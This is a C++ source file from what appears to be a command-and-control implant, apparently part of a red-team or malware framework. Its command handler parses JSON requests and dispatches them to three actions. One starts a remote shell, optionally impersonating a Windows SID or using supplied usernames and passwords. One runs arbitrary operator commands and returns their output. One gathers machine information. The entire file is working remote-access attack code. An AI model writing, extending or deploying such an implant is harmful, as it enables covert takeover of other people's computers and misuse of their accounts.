#define NOMINMAX
#include "CommandHandler.h"

#include "Logger/GlobalLogger.h"
#include "serialization/MachineInfoSerializer.h"
#include <rapidjson/writer.h>
#include <rapidjson/stringbuffer.h>

#include "Attacks/Collection/sysinfo.hpp"
#include "Attacks/Execution/Shell.hpp"
#ifdef _WIN32
#include "utils/win32/include/WinUtils.hpp"
#include "utils/win32/include/UserUtils.hpp"
#include "utils/GeneralUtils.hpp"
#endif

using namespace CppAgent;
using rapidjson::Document;
using rapidjson::Value;

CommandHandler::CommandHandler()
{
    registry_.emplace(StartShell,          &CommandHandler::onStartShell);
    registry_.emplace(RunCommand,          &CommandHandler::onRunCommand);
    registry_.emplace(GetBasicMachineInfo, &CommandHandler::onGetBasicMachineInfo);
}

std::string CommandHandler::handle(std::string_view reqJson)
{
    Document d;
    if (d.Parse(reqJson.data(), reqJson.size()).HasParseError() || !d.IsObject())
        return makeError("JSON parse error");

    int cmdId{};
    if (!json::getInt(d, "action_id", cmdId) && !json::getInt(d, "action", cmdId))
        return makeError("Missing action_id");
    
    DARKSCRY_LOG("CommandHandler: action_id = " + std::to_string(cmdId), Logger::Level::Debug);

    auto it = registry_.find(cmdId);
    if (it == registry_.end())
        return makeError("Unknown action");

    try {
        return std::invoke(it->second, this, std::cref(d));
    } catch (const std::exception& ex) {
        DARKSCRY_LOG(ex.what(), Logger::Level::Error);
        return makeError(ex.what());
    }
}

std::string CommandHandler::onStartShell(const Document& req)
{
    if (!shell_) shell_ = std::make_unique<execution::Shell>();
#ifdef _WIN32
    ShellLaunchDesc desc;                      // default = CurrentUser

    const Value* cmd = nullptr;
    if (json::getObject(req, "command", cmd))
    {
        std::string mode;
        json::getString(*cmd, "creation_type", mode);

        if (mode == "impersonate_sid")
        {
            std::string sid;
            if (!json::getString(*cmd, "sid", sid) || sid.empty())
                return makeError("sid missing");
            desc.kind = ShellLaunchKind::ImpersonateSid;
            desc.sid  = win32::charToWchar(sid.c_str());
        }
        else if (mode == "credentials")
        {
            std::string user, pwd;
            json::getString(*cmd, "username", user);
            json::getString(*cmd, "password", pwd);
            desc.kind     = ShellLaunchKind::Credentials;
            desc.username = win32::charToWchar(user.c_str());
            desc.password = win32::charToWchar(pwd.c_str());
        }
        /* else keep CurrentUser */
    }

    bool ok = shell_->create(desc);
#else
    bool ok = shell_->create();                // Linux / macOS path
#endif
    return ok ? makeSuccess(rapidjson::Value(rapidjson::kNullType))
              : makeError("Shell start failed");
}

std::string CommandHandler::onRunCommand(const Document& req)
{
    if (!shell_ || !shell_->is_running())
        return makeError("Shell not running");

    std::string cmd;
    if (!json::getString(req, "command", cmd) || cmd.empty())
        return makeError("Missing or empty command");

    std::string out = shell_->run_command(cmd);
    Document d; d.SetObject();
    d.AddMember("output", Value(out.c_str(), d.GetAllocator()), d.GetAllocator());
    return makeSuccess(d);
}

std::string CommandHandler::onGetBasicMachineInfo(const Document&)
{
    auto info = sysinfo::get_basic_machine_info();

    Document tmp; tmp.SetObject();
    tmp.AddMember("machine_info", serialization::toJson(info, tmp.GetAllocator()), tmp.GetAllocator());
    return makeSuccess(tmp["machine_info"]);
}

std::string CommandHandler::makeSuccess(const Value& data)
{
    Document d; d.SetObject();
    auto& a = d.GetAllocator();
    d.AddMember("success", true, a);
    d.AddMember("data",    Value(data, a), a);
    d.AddMember("error",   Value(rapidjson::kNullType), a);

    rapidjson::StringBuffer buf;
    rapidjson::Writer<rapidjson::StringBuffer> wr(buf);
    d.Accept(wr);
    return buf.GetString();
}

std::string CommandHandler::makeError(const char* msg)
{
    Document d; d.SetObject();
    auto& a = d.GetAllocator();
    d.AddMember("success", false, a);
    d.AddMember("data",    Value(rapidjson::kNullType), a);
    d.AddMember("error",   Value(msg, a), a);

    rapidjson::StringBuffer buf;
    rapidjson::Writer<rapidjson::StringBuffer> wr(buf);
    d.Accept(wr);
    return buf.GetString();
}
